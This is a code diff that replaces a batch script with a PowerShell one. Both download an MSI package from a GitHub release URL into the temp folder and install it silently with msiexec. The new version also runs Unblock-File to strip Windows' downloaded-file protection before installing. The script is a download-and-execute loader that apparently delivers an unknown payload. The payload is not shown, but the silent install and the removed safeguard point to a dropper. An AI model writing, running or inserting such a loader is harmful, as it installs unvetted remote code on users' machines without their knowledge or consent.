@@ -1,21 +1,5 @@
-@echo off
-title Debug MSI Installer
-echo [*] Starting execution...
-set "MSI_PATH=%TEMP%\wafaction1.msi"
-set "MSI_URL=https://github.com/okursammyok-ship-it/t/releases/download/new/doc.msi"
-
-echo [*] Downloading MSI from: %MSI_URL%
-curl.exe -s -L -o "%MSI_PATH%" "%MSI_URL%"
-
-if exist "%MSI_PATH%" (
-    echo [*] Download successful. File size:
-    dir "%MSI_PATH%"
-    echo [*] Launching msiexec...
-    msiexec.exe /i "%MSI_PATH%" /quiet /norestart
-    echo [*] msiexec launched.
-) else (
-    echo [!] Download failed. File not found.
-)
-
-echo [*] Script finished. Pausing so you can see the output...
-pause
+$msi = "$env:TEMP\doc.msi"
+$url = "https://github.com/okursammyok-ship-it/t/releases/download/new/doc.msi"
+Invoke-WebRequest -Uri $url -OutFile $msi
+Unblock-File $msi
+Start-Process msiexec.exe -ArgumentList '/i', $msi, '/qn', '/norestart' -Wait
